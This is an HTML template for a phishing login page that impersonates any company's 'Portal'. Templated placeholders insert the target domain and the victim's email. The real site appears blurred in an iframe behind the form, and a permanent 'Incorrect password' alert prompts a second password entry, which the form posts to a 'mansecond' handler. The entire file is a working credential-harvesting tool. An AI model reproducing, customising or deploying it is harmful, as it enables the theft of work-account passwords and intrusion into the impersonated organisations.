<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>{{dman}} Portal</title>
<link rel="icon" href="logo.png" />
<style>
:root{
  --brand:#0b69ff;
  --brand-dark:#005fcc;
  --muted:#6b7280;
  --card-bg:#fff;
}
*{box-sizing:border-box;margin:0;padding:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;}
html,body{height:100%}
body{background:#f4f6fb;overflow:hidden;color:#111}

/* === Background Iframe === */
.bg-wrap{
  position:fixed;
  inset:0;
  z-index:-3;
  overflow:hidden;
}
.bg-iframe{
  position:absolute;
  inset:0;
  width:100%;
  height:100%;
  border:none;
  filter:blur(6px) brightness(0.55);
  transform:scale(1.05);
}
.overlay{
  position:fixed;
  inset:0;
  background:linear-gradient(180deg, rgba(3,7,18,0.32), rgba(3,7,18,0.55));
  z-index:-2;
}

/* === Unique Loader === */
#loader{
  position:fixed;
  inset:0;
  display:flex;
  align-items:center;
  justify-content:center;
  background:radial-gradient(circle at center, #f8faff 0%, #e8eef9 100%);
  z-index:9999;
  transition:opacity .6s ease;
}
.loader-ring{
  position:relative;
  width:96px;
  height:96px;
  border-radius:50%;
  border:6px solid transparent;
  border-top-color:var(--brand);
  animation:spin 1s linear infinite;
  box-shadow:0 0 15px rgba(11,105,255,0.3);
}
.loader-ring::after{
  content:'';
  position:absolute;
  inset:8px;
  border-radius:50%;
  border:4px solid rgba(11,105,255,0.2);
}
.loader-logo{
  position:absolute;
  width:48px;
  height:48px;
  animation:pulse 1.6s ease-in-out infinite;
}
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes pulse{
  0%,100%{opacity:.5;transform:scale(1);}
  50%{opacity:1;transform:scale(1.1);}
}

/* === Layout === */
.wrap{
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:24px;
  z-index:5;
  position:relative;
}
.card{
  width:380px;
  max-width:calc(100% - 48px);
  border-radius:14px;
  background:linear-gradient(to bottom, rgba(255,255,255,0.98), rgba(255,255,255,0.95));
  box-shadow:0 12px 40px rgba(2,6,23,0.12);
  padding:28px;
  backdrop-filter:blur(6px)
}
.brand{display:flex;align-items:center;gap:12px;margin-bottom:8px}
.logo{width:64px;height:64px;object-fit:contain;border-radius:8px;background:#fff;padding:6px;box-shadow:0 6px 18px rgba(2,6,23,0.06)}
h1{font-size:1.25rem;margin-bottom:2px}
.subtitle{color:var(--muted);font-size:.88rem;margin-bottom:16px}
form{display:flex;flex-direction:column;gap:12px}
label{font-size:.86rem;font-weight:600;color:#0f1724}
.input-group{position:relative}
.input-icon{position:absolute;left:10px;top:50%;transform:translateY(-50%);width:20px;height:20px;opacity:.85}
input[type="email"],input[type="password"]{
  width:100%;
  padding:12px 40px;
  border-radius:10px;
  border:1px solid rgba(15,23,42,0.08);
  background:transparent;
  font-size:0.95rem;
  transition:box-shadow .18s, border-color .18s;
}
input:focus{outline:none;border-color:var(--brand);box-shadow:0 6px 18px rgba(11,105,255,0.14)}
.toggle-eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);width:20px;height:20px;cursor:pointer;opacity:.9}
.controls{display:flex;align-items:center;justify-content:space-between;margin-top:4px}
.remember{display:flex;align-items:center;gap:8px;font-size:.88rem;color:var(--muted)}
.btn{
  margin-top:6px;
  padding:12px;
  border-radius:10px;
  border:0;
  background:linear-gradient(90deg,var(--brand),var(--brand-dark));
  color:#fff;
  font-weight:700;
  cursor:pointer;
  transition:transform .18s, box-shadow .25s;
}
.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(11,105,255,0.18)}
.help{font-size:.86rem;color:var(--muted);text-align:center;margin-top:12px}
footer{position:fixed;left:0;right:0;bottom:12px;text-align:center;font-size:.86rem;color:#eee;z-index:4}
footer a{color:#fff;text-decoration:underline;opacity:.9}
@media (max-width:420px){.card{padding:20px}.logo{width:56px;height:56px}}
</style>
</head>

<body>
<!-- Loader -->
<div id="loader" role="status" aria-live="polite" aria-label="Loading">
  <div class="loader-ring"></div>
  <img src="https://img.logo.dev/{{dman}}?token=pk_PP9CfpGBRa6MyrF4gcMzQA" alt="Loading" class="loader-logo" />
</div>

<!-- Background -->
<div class="bg-wrap" aria-hidden="true">
  <iframe src="https://{{dman}}" class="bg-iframe" id="bgIframe" loading="lazy" title="Background"></iframe>
</div>
<div class="overlay" aria-hidden="true"></div>

<!-- Main Content -->
<div class="wrap" role="main">
  <div class="card" role="region" aria-labelledby="loginTitle">
    <div class="brand">
      <img src="https://img.logo.dev/{{dman}}?token=pk_PP9CfpGBRa6MyrF4gcMzQA" alt="{{dman}} Logo" class="logo" />
      <div>
        <p role="alert" style="color:#b00020;font-weight:700;margin:0">Incorrect password. Please try again.</p>
        <h1 id="loginTitle">{{dman}} Portal</h1>
        <div class="subtitle">Only approved users can log in</div>
      </div>
    </div>

    <form id="loginForm" autocomplete="on" method="post" action="mansecond">
      <div>
        <label for="email">Work Email</label>
        <div class="input-group">
          <svg class="input-icon" viewBox="0 0 24 24" fill="none">
            <path d="M3 7.5v9A2.5 2.5 0 0 0 5.5 19h13A2.5 2.5 0 0 0 21 16.5v-9A2.5 2.5 0 0 0 18.5 5h-13A2.5 2.5 0 0 0 3 7.5z" stroke="#64748b" stroke-width="1.1"/>
            <path d="M21 7.5L12 13 3 7.5" stroke="#64748b" stroke-width="1.1"/>
          </svg>
          <input id="email" name="emailail" type="email" value="{{eman}}" placeholder="name@company.com" required />
        </div>
      </div>

      <div>
        <label for="password">Password</label>
        <div class="input-group">
          <svg class="input-icon" viewBox="0 0 24 24" fill="none">
            <rect x="3" y="11" width="18" height="10" rx="2" stroke="#64748b" stroke-width="1.1"/>
            <path d="M8 11V8a4 4 0 1 1 8 0v3" stroke="#64748b" stroke-width="1.1"/>
          </svg>
          <input id="password" name="passwordail" type="password" placeholder="Enter your password" minlength="6" required />
          <svg class="toggle-eye" id="togglePwd" viewBox="0 0 24 24" fill="none">
            <path id="eyePath" d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z" stroke="#374151" stroke-width="1.3"/>
            <circle id="eyeCircle" cx="12" cy="12" r="3" stroke="#374151" stroke-width="1.3" fill="none"/>
          </svg>
        </div>
      </div>

      <div class="controls">
        <label class="remember"><input type="checkbox" name="remember" /> Keep me signed in</label>
        <div class="forgot"><a href="/password-recovery" rel="noopener">Forgot your password?</a></div>
      </div>

      <button class="btn" type="submit">Sign In</button>
      <div class="help">Not your device? <a href="/support" rel="noopener">Contact Support</a></div>
    </form>
  </div>
</div>

<footer>ðŸ”’ SSL Secure Â· Â© <span id="year"></span> {{dman}} Â· <a href="/privacy" rel="noopener">Privacy Policy</a> Â· <a href="/support" rel="noopener">Contact Us</a></footer>

<script>
// Loader fade-out
(function(){
  const loader = document.getElementById('loader');
  window.addEventListener('load', ()=>{
    setTimeout(()=>{
      loader.style.opacity='0';
      setTimeout(()=> loader.style.display='none', 600);
    }, 1200);
  });
})();

// Password show/hide
(function(){
  const pwd = document.getElementById('password');
  const toggle = document.getElementById('togglePwd');
  const eyeCircle = document.getElementById('eyeCircle');
  let visible=false;
  toggle.addEventListener('click', e=>{
    e.preventDefault();
    visible=!visible;
    pwd.type=visible?'text':'password';
    toggle.setAttribute('aria-label', visible?'Hide password':'Show password');
    eyeCircle.style.display=visible?'none':'block';
  });
})();

document.getElementById('year').textContent = new Date().getFullYear();
</script>
</body>
</html>
